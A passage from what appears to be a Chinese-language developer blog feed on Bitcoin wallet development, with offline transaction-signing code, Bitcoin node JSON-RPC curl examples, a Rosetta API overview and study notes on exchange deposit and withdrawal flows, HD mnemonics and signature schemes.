class="hljs-attr">publicKey</span>: <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(childKey.<span class="hljs-property">publicKey</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>),<br>    address<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-2-离线签名"><a href="#1-2-离线签名" class="headerlink" title="1.2 离线签名"></a>1.2 离线签名</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> ecc = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;tiny-secp256k1&#x27;</span>);<br><span class="hljs-keyword">const</span> &#123; <span class="hljs-title class_">BIP32Factory</span> &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;bip32&#x27;</span>);<br><span class="hljs-title class_">BIP32Factory</span>(ecc);<br><span class="hljs-keyword">const</span> bitcoin = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;bitcoinjs-lib&#x27;</span>);<br><span class="hljs-keyword">const</span> bitcore = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;bitcore-lib&#x27;</span>);<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@returns</span></span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> <span class="hljs-variable">params</span></span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">// 构建签名Tx</span><br><span class="hljs-comment">// 它接受一个参数 params，其中包含 privateKey（私钥）、signObj（签名对象）和 network（网络）等属性</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">buildAndSignTx</span> (<span class="hljs-attr">params</span>: &#123; <span class="hljs-attr">privateKey</span>: string; <span class="hljs-attr">signObj</span>: any; <span class="hljs-attr">network</span>: string; &#125;): string &#123;<br>  <span class="hljs-keyword">const</span> &#123; privateKey, signObj, network &#125; = params;<br>  <span class="hljs-keyword">const</span> net = bitcore.<span class="hljs-property">Networks</span>[network];<br>  <span class="hljs-keyword">const</span> inputs = signObj.<span class="hljs-property">inputs</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">input</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">return</span> &#123;<br>      <span class="hljs-attr">address</span>: input.<span class="hljs-property">address</span>,<br>      <span class="hljs-attr">txId</span>: input.<span class="hljs-property">txid</span>,<br>      <span class="hljs-attr">outputIndex</span>: input.<span class="hljs-property">vout</span>,<br>      <span class="hljs-comment">// eslint-disable-next-line new-cap</span><br>      <span class="hljs-attr">script</span>: <span class="hljs-keyword">new</span> bitcore.<span class="hljs-property">Script</span>.<span class="hljs-title function_">fromAddress</span>(input.<span class="hljs-property">address</span>).<span class="hljs-title function_">toHex</span>(),<br>      <span class="hljs-attr">satoshis</span>: input.<span class="hljs-property">amount</span><br>    &#125;;<br>  &#125;);<br>  <span class="hljs-keyword">const</span> outputs = signObj.<span class="hljs-property">outputs</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">output</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">return</span> &#123;<br>      <span class="hljs-attr">address</span>: output.<span class="hljs-property">address</span>,<br>      <span class="hljs-attr">satoshis</span>: output.<span class="hljs-property">amount</span><br>    &#125;;<br>  &#125;);<br>  <span class="hljs-keyword">const</span> transaction = <span class="hljs-keyword">new</span> bitcore.<span class="hljs-title class_">Transaction</span>(net).<span class="hljs-title function_">from</span>(inputs).<span class="hljs-title function_">to</span>(outputs);<br>  transaction.<span class="hljs-property">version</span> = <span class="hljs-number">2</span>;<br>  transaction.<span class="hljs-title function_">sign</span>(privateKey);<br>  <span class="hljs-comment">// 返回交易信息</span><br>  <span class="hljs-keyword">return</span> transaction.<span class="hljs-title function_">toString</span>();<br>&#125;<br><span class="hljs-comment">// 构建未签名消息并且签名</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">buildUnsignTxAndSign</span> (params) &#123;<br>  <span class="hljs-keyword">const</span> &#123; keyPair, signObj, network &#125; = params;<br>  <span class="hljs-keyword">const</span> psbt = <span class="hljs-keyword">new</span> bitcoin.<span class="hljs-title class_">Psbt</span>(&#123; network &#125;);<br>  <span class="hljs-keyword">const</span> inputs = signObj.<span class="hljs-property">inputs</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">input</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">return</span> &#123;<br>      <span class="hljs-attr">address</span>: input.<span class="hljs-property">address</span>,<br>      <span class="hljs-attr">txId</span>: input.<span class="hljs-property">txid</span>,<br>      <span class="hljs-attr">outputIndex</span>: input.<span class="hljs-property">vout</span>,<br>      <span class="hljs-comment">// eslint-disable-next-line new-cap</span><br>      <span class="hljs-attr">script</span>: <span class="hljs-keyword">new</span> bitcore.<span class="hljs-property">Script</span>.<span class="hljs-title function_">fromAddress</span>(input.<span class="hljs-property">address</span>).<span class="hljs-title function_">toHex</span>(),<br>      <span class="hljs-attr">satoshis</span>: input.<span class="hljs-property">amount</span><br>    &#125;;<br>  &#125;);<br>  psbt.<span class="hljs-title function_">addInput</span>(inputs);<br><br>  <span class="hljs-keyword">const</span> outputs = signObj.<span class="hljs-property">outputs</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">output</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">return</span> &#123;<br>      <span class="hljs-attr">address</span>: output.<span class="hljs-property">address</span>,<br>      <span class="hljs-attr">satoshis</span>: output.<span class="hljs-property">amount</span><br>    &#125;;<br>  &#125;);<br>  psbt.<span class="hljs-title function_">addOutput</span>(outputs);<span class="hljs-comment">// 传入输出信息</span><br>  psbt.<span class="hljs-title function_">toBase64</span>();<br><br>  psbt.<span class="hljs-title function_">signInput</span>(<span class="hljs-number">0</span>, keyPair);<span class="hljs-comment">// 传入keyPair签名</span><br>  psbt.<span class="hljs-title function_">finalizeAllInputs</span>();<br><br>  <span class="hljs-keyword">const</span> signedTransaction = psbt.<span class="hljs-title function_">extractTransaction</span>().<span class="hljs-title function_">toHex</span>();<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;signedTransaction==&#x27;</span>, signedTransaction);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-3-扫链接口-分原生和Rosetta-Api"><a href="#1-3-扫链接口-分原生和Rosetta-Api" class="headerlink" title="1.3 扫链接口(分原生和Rosetta Api)"></a>1.3 扫链接口(分原生和Rosetta Api)</h2><h3 id="1-3-1原生Bitcoin接口【原生，不常用】"><a href="#1-3-1原生Bitcoin接口【原生，不常用】" class="headerlink" title="1.3.1原生Bitcoin接口【原生，不常用】"></a>1.3.1原生Bitcoin接口【原生，不常用】</h3><h4 id="1-3-1-1获取活跃的最新区块"><a href="#1-3-1-1获取活跃的最新区块" class="headerlink" title="1.3.1.1获取活跃的最新区块"></a>1.3.1.1获取活跃的最新区块</h4><ul><li>请求参数</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl --data-binary &#x27;&#123;&quot;jsonrpc&quot;: &quot;1.0&quot;, &quot;id&quot;: &quot;curltest&quot;, &quot;method&quot;: &quot;getchaintips&quot;, &quot;params&quot;: []&#125;&#x27; -H &#x27;content-type: text/plain;&#x27; https://thrilling-spring-bush.btc.quiknode.pro/c0d9254cfb049224abd0ece400635e62b791a388/<br></code></pre></td></tr></table></figure><ul><li>返回内容</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs shell">&#123;<br>   &quot;result&quot;:[<br>      &#123;<br>         &quot;height&quot;:845198,<br>         &quot;hash&quot;:&quot;00000000000000000000301d584ec5f1c16e89487c05baf035f01875cb763d75&quot;,<br>         &quot;branchlen&quot;:0,<br>         &quot;status&quot;:&quot;active&quot;<br>      &#125;,<br>      &#123;<br>         &quot;height&quot;:841424,<br>         &quot;hash&quot;:&quot;000000000000000000010998fc2714f8ae10ffb73f1986eecc58f5afc457ee07&quot;,<br>         &quot;branchlen&quot;:1,<br>         &quot;status&quot;:&quot;valid-headers&quot;<br>      &#125;,<br>      &#123;<br>         &quot;height&quot;:838792,<br>         &quot;hash&quot;:&quot;00000000000000000002af7214c8796e102b0e9074a5d469266d7afe5af2f087&quot;,<br>         &quot;branchlen&quot;:1,<br>         &quot;status&quot;:&quot;headers-only&quot;<br>      &#125;,<br>      &#123;<br>         &quot;height&quot;:816358,<br>         &quot;hash&quot;:&quot;00000000000000000001d5f92e2dbbfcbc1e859873117e7983dd574857da5e14&quot;,<br>         &quot;branchlen&quot;:1,<br>         &quot;status&quot;:&quot;valid-headers&quot;<br>      &#125;,<br>      &#123;<br>         &quot;height&quot;:815202,<br>         &quot;hash&quot;:&quot;0000000000000000000093917031004a140b6db5c6adec217f814db98d7f0bde&quot;,<br>         &quot;branchlen&quot;:1,<br>         &quot;status&quot;:&quot;valid-fork&quot;<br>      &#125;,<br>   ],<br>   &quot;error&quot;:null,<br>   &quot;id&quot;:&quot;curltest&quot;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>“invalid” 该分支至少包含一个无效块</li><li>“headers-only” 并非该分支的所有块都可用，但 headers 有效</li><li>“valid-headers”所有块都可用于此分支，但它们从未经过完全验证</li><li>“valid-fork” 该分支不是活动链的一部分，但经过充分验证</li><li>“active”这是活跃主链的提示，这当然有效</li></ul><h4 id="1-3-1-2-获取区块信息"><a href="#1-3-1-2-获取区块信息" class="headerlink" title="1.3.1.2 获取区块信息"></a>1.3.1.2 获取区块信息</h4><ul><li>请求示范</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl --data-binary &#x27;&#123;&quot;jsonrpc&quot;: &quot;1.0&quot;, &quot;id&quot;: &quot;curltest&quot;, &quot;method&quot;: &quot;getblockchaininfo&quot;, &quot;params&quot;: []&#125;&#x27; -H &#x27;content-type: text/plain;&#x27; https://thrilling-spring-bush.btc.quiknode.pro/c0d9254cfb049224abd0ece400635e62b791a388/<br></code></pre></td></tr></table></figure><ul><li>返回内容</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">&#123;<br>   &quot;result&quot;:&#123;<br>      &quot;chain&quot;:&quot;main&quot;,<br>      &quot;blocks&quot;:845200,<br>      &quot;headers&quot;:845200,<br>      &quot;bestblockhash&quot;:&quot;000000000000000000027a970865a12b12e4da473011e2033eeca871c957a747&quot;,<br>      &quot;difficulty&quot;:84381461788831.34,<br>      &quot;time&quot;:1716706327,<br>      &quot;mediantime&quot;:1716703878,<br>      &quot;verificationprogress&quot;:0.999998974207445,<br>      &quot;initialblockdownload&quot;:false,<br>      &quot;chainwork&quot;:&quot;00000000000000000000000000000000000000007b695dedb46255cb840f5cb6&quot;,<br>      &quot;size_on_disk&quot;:652535688171,<br>      &quot;pruned&quot;:false,<br>      &quot;warnings&quot;:&quot;&quot;<br>   &#125;,<br>   &quot;error&quot;:null,<br>   &quot;id&quot;:&quot;curltest&quot;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="1-3-1-3-列出未花费的输入输出"><a href="#1-3-1-3-列出未花费的输入输出" class="headerlink" title="1.3.1.3 列出未花费的输入输出"></a>1.3.1.3 <strong>列出未花费的输入输出</strong></h4><ul><li>请求示范</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl --data-binary &#x27;&#123;&quot;jsonrpc&quot;: &quot;1.0&quot;, &quot;id&quot;: &quot;curltest&quot;, &quot;method&quot;: &quot;listunspent&quot;, &quot;params&quot;: [845000, 845200, [] , true, &#123; &quot;minimumAmount&quot;: 0.005 &#125; ]&#125;&#x27; -H &#x27;content-type: text/plain;&#x27;  https://thrilling-spring-bush.btc.quiknode.pro/c0d9254cfb049224abd0ece400635e62b791a388/<br></code></pre></td></tr></table></figure><ul><li>返回值</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs shell">[                                <br>  &#123;                              <br>    &quot;txid&quot; : &quot;&quot;,             <br>    &quot;vout&quot; : 1,                 <br>    &quot;address&quot; : &quot;str&quot;,           <br>    &quot;label&quot; : &quot;str&quot;,             <br>    &quot;scriptPubKey&quot; : &quot;str&quot;,     <br>    &quot;amount&quot; : 10000,               <br>    &quot;confirmations&quot; : 12,        <br>    &quot;redeemScript&quot; : &quot;hex&quot;,     <br>    &quot;witnessScript&quot; : &quot;str&quot;,    <br>    &quot;spendable&quot; : false,    <br>    &quot;solvable&quot; : false,     <br>    &quot;reused&quot; : false,       <br>    &quot;desc&quot; : &quot;str&quot;,              <br>    &quot;safe&quot; : true                                      <br>  &#125;,&#123;                              <br>    &quot;txid&quot; : &quot;&quot;,             <br>    &quot;vout&quot; : 1,                 <br>    &quot;address&quot; : &quot;str&quot;,           <br>    &quot;label&quot; : &quot;str&quot;,             <br>    &quot;scriptPubKey&quot; : &quot;str&quot;,     <br>    &quot;amount&quot; : 10000,               <br>    &quot;confirmations&quot; : 12,        <br>    &quot;redeemScript&quot; : &quot;hex&quot;,     <br>    &quot;witnessScript&quot; : &quot;str&quot;,    <br>    &quot;spendable&quot; : false,    <br>    &quot;solvable&quot; : false,     <br>    &quot;reused&quot; : false,       <br>    &quot;desc&quot; : &quot;str&quot;,              <br>    &quot;safe&quot; : true                                      <br>  &#125;,<br>]<br></code></pre></td></tr></table></figure><h4 id="1-3-1-4发送交易到区块链网络"><a href="#1-3-1-4发送交易到区块链网络" class="headerlink" title="1.3.1.4发送交易到区块链网络"></a>1.3.1.4<strong>发送交易到区块链网络</strong></h4><ul><li>请求参数</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl --data-binary &#x27;&#123;&quot;jsonrpc&quot;: &quot;1.0&quot;, &quot;id&quot;: &quot;curltest&quot;, &quot;method&quot;: &quot;sendrawtransaction&quot;, &quot;params&quot;: [&quot;signedhex&quot;]&#125;&#x27; -H &#x27;content-type: text/plain;&#x27; https://thrilling-spring-bush.btc.quiknode.pro/c0d9254cfb049224abd0ece400635e62b791a388/<br></code></pre></td></tr></table></figure><ul><li>返回值</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">成功返回交易 Hash<br></code></pre></td></tr></table></figure><h3 id="1-3-2-Rosetta-Api【常用，支持生态好】"><a href="#1-3-2-Rosetta-Api【常用，支持生态好】" class="headerlink" title="1.3.2 Rosetta Api【常用，支持生态好】"></a>1.3.2 Rosetta Api【常用，支持生态好】</h3><p>Bitcoin Rosetta API 是由 Coinbase 提出的 Rosetta 标准的一部分，旨在为区块链和钱包提供一个统一的接口标准。这个标准化的接口使得与各种区块链的交互更加容易和一致，无论是对交易数据的读取还是写入。目前已经支持很多链，包含比特币，以太坊等主流链，也包含像 IoTex 和 Oasis 这样的非主流链。</p><p><strong>3.2.1.Rosetta API 概述</strong></p><p>Rosetta API 分为两部分：</p><ul><li>Data API：用于读取区块链数据。</li><li>Construction API：用于构建和提交交易。</li></ul><p><strong>3.2.2. Data API</strong></p><p>Data API 提供了一组端点，用于检索区块链数据，如区块、交易、余额等。主要端点包括：</p><ul><li>&#x2F;network&#x2F;list：返回支持的网络列表。</li><li>&#x2F;network&#x2F;status：返回当前网络的状态信息。</li><li>&#x2F;network&#x2F;options：返回支持的网络选项和版本信息。</li><li>&#x2F;block：返回指定区块的数据。</li><li>&#x2F;block&#x2F;transaction：返回指定交易的数据。</li><li>&#x2F;account&#x2F;balance：返回指定账户的余额。</li><li>&#x2F;mempool：返回当前未确认的交易池。</li><li>&#x2F;mempool&#x2F;transaction：返回指定未确认交易的数据。</li></ul><p><strong>3.2.3. Construction API</strong></p><p>Construction API 提供了一组端点，用于创建、签名和提交交易。主要端点包括：</p><ul><li>&#x2F;construction&#x2F;preprocess：分析交易需求并返回交易所需的元数据。</li><li>&#x2F;construction&#x2F;metadata：返回构建交易所需的元数据。</li><li>&#x2F;construction&#x2F;payloads：生成待签名的交易有效载荷。</li><li>&#x2F;construction&#x2F;parse：解析交易并返回其操作。</li><li>&#x2F;construction&#x2F;combine：将签名与待签名交易合并。</li><li>&#x2F;construction&#x2F;hash：返回交易的唯一标识符（哈希）。</li><li>&#x2F;construction&#x2F;submit：提交签名后的交易。</li></ul><p><strong>3.2.4.开发 BTC 钱包使用到的 Rosetta Api</strong></p><p>为了具体实现 Rosetta API，开发者需要遵循 Rosetta 标准并根据比特币区块链的特性进行适配。以下是一些具体实现细节</p><p>数据结构：</p><ul><li>区块：包含区块哈希、前一个区块哈希、区块高度、时间戳、交易列表等。</li><li>交易：包含交易哈希、输入输出列表、金额、地址等。</li><li>账户：包含账户地址和余额信息。</li></ul><p><strong>用到的接口</strong></p><ul><li>&#x2F;network&#x2F;list：返回比特币主网和测试网信息。</li><li>&#x2F;network&#x2F;status：返回当前最新区块、已同步区块高度、区块链处理器的状态等。</li><li>&#x2F;block 和 &#x2F;block&#x2F;transaction：返回区块和交易的详细信息，包括交易的输入输出、金额、地址等。</li><li>&#x2F;account&#x2F;balance：通过查询比特币节点，返回指定地址的余额。</li></ul><p><strong>发送交易到区块链网络</strong></p><ul><li>&#x2F;construction&#x2F;submit：通过比特币节点提交签名后的交易。</li></ul><h2 id="3-3-文档资料"><a href="#3-3-文档资料" class="headerlink" title="3.3. 文档资料"></a>3.3. 文档资料</h2><ul><li><p>比特币开发文档：</p><p><a href="https://developer.bitcoin.org/reference/rpc/">https://developer.bitcoin.org/reference/rpc/</a></p></li><li><p>Rosetta 开发文档：</p><p><a href="https://docs.cdp.coinbase.com/rosetta/reference/networklist/">https://docs.cdp.coinbase.com/rosetta/reference/networklist/</a></p></li><li><p>Rosetta 开发文档：</p><p><a href="https://github.com/coinbase/mesh-ecosystem/blob/master/implementations.md">https://github.com/coinbase/mesh-ecosystem/blob/master/implementations.md</a></p></li><li><p>浏览器：</p><p><a href="https://btc.com/zh-CN">https://btc.com/zh-CN</a></p></li></ul><p>2、以太坊钱包开发</p><p>3、比特币schnorr地址和签名流程细化</p><p>而且专属名词太多啦，一句话就蹦出了lucky eap159 eip484 Blake 一大堆，不专注，一下子就让人懵了（主要是我这种币圈外的人）</p>]]></content>
    
    
    <categories>
      
      <category>blockChain</category>
      
    </categories>
    
    
    <tags>
      
      <tag>block</tag>
      
      <tag>概念</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0601 钱包部分小总结</title>
    <link href="/2024/05/30/061%E9%92%B1%E5%8C%85%E9%83%A8%E5%88%86%E5%B0%8F%E6%80%BB%E7%BB%93/"/>
    <url>/2024/05/30/061%E9%92%B1%E5%8C%85%E9%83%A8%E5%88%86%E5%B0%8F%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="1-描述一下交易所钱包的充值和提现流程"><a href="#1-描述一下交易所钱包的充值和提现流程" class="headerlink" title="1.描述一下交易所钱包的充值和提现流程"></a>1.描述一下交易所钱包的充值和提现流程</h2><h3 id="充值"><a href="#充值" class="headerlink" title="充值"></a>充值</h3><ul><li>交易所给用户提供地址，用户把钱转进来</li><li>扫链：获取最新块高，从上一次解析的块开始到最新块高进行交易解析</li><li>交易解析完之后，如果交易里面 to 是系统用户，则是充值，解析完成之后<strong>上账</strong>，并通知<strong>业务层</strong></li></ul><h3 id="提现"><a href="#提现" class="headerlink" title="提现"></a>提现</h3><p>1.获取签名参数–&gt;2.离线签名–&gt;3.广播出去—&gt;把交易哈希更新数据库—-&gt;扫链解析确认是否完成</p><ul><li>获取需要的签名参数（这里就看了）<ul><li>ETH：获取三个：Nonce(Number once的缩写)、gasprice、 gaslimite </li><li>BTC：Version、Input、Output、Locktime、Sequence、Hash Type这些</li><li>Atom ：Account Number（唯一账户编号） Sequence（顺序）fess(手续费)</li></ul></li><li>交易离线签名：<ul><li>组织交易，先生成<strong>待签名</strong>消息摘要，</li><li>将待签名的消息摘要递给签名机进行<strong>签名</strong>，</li><li>签名机签名完成之后返回<strong>签名串</strong></li></ul></li><li>广播出去：拿到了离线签名后构建完整的交易并发送区块链网络，将签名时计算出来的交易 Hash 或者发送交易时返回交易 Hash 更新到数据库</li><li>扫链解析到这笔交易，说明提现成功。</li></ul><h2 id="2-HD-钱包助记词生成的流程"><a href="#2-HD-钱包助记词生成的流程" class="headerlink" title="2.HD 钱包助记词生成的流程"></a>2.HD 钱包助记词生成的流程</h2><ul><li>第一步：随机熵生成</li><li>第二步：计算校验和</li><li>第三步：组合熵和校验和</li><li>第四步：分割助记词索引</li><li>第五步：映射为助记词</li></ul><h2 id="3-助记词的验证过程"><a href="#3-助记词的验证过程" class="headerlink" title="3.助记词的验证过程"></a>3.助记词的验证过程</h2><ul><li>第一步：检查助记词数量</li><li>第二步：检查助记词是否在词汇表</li><li>第三步：将助记词转换成索引</li><li>第四步：提取种子的校验和</li><li>第五步：计算校验和</li><li>第六步：验证校验和</li></ul><h2 id="4-BIP44-路径"><a href="#4-BIP44-路径" class="headerlink" title="4.BIP44 路径"></a>4.BIP44 路径</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">m<span class="hljs-regexp">/44&#x27;/</span>coin_type<span class="hljs-string">&#x27;/account&#x27;</span><span class="hljs-regexp">/change/</span>address_index<br></code></pre></td></tr></table></figure><p>account 标记账户类型，便于分类，默认为0</p><p>change ： 比特币特有的，找零地址就是1</p><h2 id="5-门限共享秘密拆分过程MPC"><a href="#5-门限共享秘密拆分过程MPC" class="headerlink" title="5.门限共享秘密拆分过程MPC"></a>5.门限共享秘密拆分过程MPC</h2><p>秘密—–&gt; n 份，k 份可恢复， 任意 k 份恢复出这个秘密，分别用门限共享算法和逆门限共享秘密算法</p><h2 id="5-MPC-GG20-算法-Keygen-和-Sign-分别需要经过多少轮共识"><a href="#5-MPC-GG20-算法-Keygen-和-Sign-分别需要经过多少轮共识" class="headerlink" title="5.MPC GG20 算法 Keygen 和 Sign 分别需要经过多少轮共识"></a>5.MPC GG20 算法 Keygen 和 Sign 分别需要经过多少轮共识</h2><ul><li>Keygen: 4 轮</li><li>Sign: 7 轮</li></ul><h2 id="6-为什么-schnorr-比特币手续费可以降低"><a href="#6-为什么-schnorr-比特币手续费可以降低" class="headerlink" title="6.为什么 schnorr 比特币手续费可以降低"></a>6.为什么 schnorr 比特币手续费可以降低</h2><p>schnorr 签名聚合成一个签名，还有短密钥，这样签名的数据会比 ECDSA 短很多，所以相对于 ECDSA 签名的交易会便宜很多</p><h2 id="7-为什么比特币早期时候不直接用-schnorr-签名算法"><a href="#7-为什么比特币早期时候不直接用-schnorr-签名算法" class="headerlink" title="7. 为什么比特币早期时候不直接用 schnorr 签名算法"></a>7. 为什么比特币早期时候不直接用 schnorr 签名算法</h2><p>因为当时 schnorr 算法在专利期</p><h2 id="8-相比较之下-EDDSA-性能，安全性都会高一些，为什么比特币以太坊用了-ECDSA，没有用-EDDSA"><a href="#8-相比较之下-EDDSA-性能，安全性都会高一些，为什么比特币以太坊用了-ECDSA，没有用-EDDSA" class="headerlink" title="8. 相比较之下 EDDSA 性能，安全性都会高一些，为什么比特币以太坊用了 ECDSA，没有用 EDDSA"></a>8. 相比较之下 EDDSA 性能，安全性都会高一些，为什么比特币以太坊用了 ECDSA，没有用 EDDSA</h2><ul><li>ECDSA 是基于更早的标准（如 FIPS 186-4 和 ANSI X9.62）发展的，因此在密码学界和工业界有较长的使用历史和广泛的标准化支持。它被大量系统和协议（如 TLS 和 Bitcoin）采用，形成了一个庞大的生态系统。</li><li>虽然 EdDSA 有一些优势，如不容易受到侧信道攻击的影响（如时间攻击和缓存攻击），但 ECDSA 的安全性也已经过广泛的研究和验证。对于很多开发者和企业来说，使用一个已被长期验证的算法是更为保守和安全的选择。</li><li>EdDSA 通常具有更高的签名速度和较快的验证速度，尤其是在大多数软件实现中。然而，对于已经高度优化的 ECDSA 实现，性能差异在许多应用中可能并不明显。</li><li>EdDSA 的设计更为简单且更不易出错，特别是在处理随机数生成等方面。然而，ECDSA 由于使用历史更长，开发者更为熟悉其使用和管理。</li></ul><h2 id="9-中心化钱包开发里面的充值，提现，归集，转冷，冷转热开发业务流程描述"><a href="#9-中心化钱包开发里面的充值，提现，归集，转冷，冷转热开发业务流程描述" class="headerlink" title="9.中心化钱包开发里面的充值，提现，归集，转冷，冷转热开发业务流程描述"></a>9.中心化钱包开发里面的充值，提现，归集，转冷，冷转热开发业务流程描述</h2><p>💡💡接口返回的 to 是交易所系统里面的用户地址，这笔交易为充值交易；</p><p> 💡💡接口返回的 from 是交易所系统里面的用户地址，这笔交易为提现交易； </p><p>💡💡接口返回的 to 是交易所的归集地址，from 是系统的用户地址，这笔交易资金归集交易； </p><p>💡💡接口返回的 to 地址是冷钱包地址，from 地址时热钱包地址，这笔交易热转冷的交易。 </p><p>💡💡接口返回的 from 地址是冷钱包地址，to 地址时热钱包地址，这笔交易冷转热的交易。</p><h3 id="充值-1"><a href="#充值-1" class="headerlink" title="充值"></a>充值</h3><p>扫链—&gt;解析交易–&gt;确认地址是系统地址则判断为充值—&gt;通知业务层，持久化存储</p><ul><li>获得最新块高；更新到数据库</li><li>从数据库中获取上次解析交易的块高做为起始块高，最新块高为截止块高，如果数据库中没有记录，说明需要从头开始扫，起始块高为 0；</li><li>解析区块里面的交易，to 地址是系统内部的用户地址，说明用户充值，更新交易到数据库中，将交易的状态设置为待确认。</li><li>所在块的交易过了确认位，将交易状态更新位充值成功并通知业务层。</li><li>解析到的充值交易需要在钱包的数据库里面维护 nonce, 当然也可以不维护，签名的时候去链上获取</li></ul><h3 id="提现-1"><a href="#提现-1" class="headerlink" 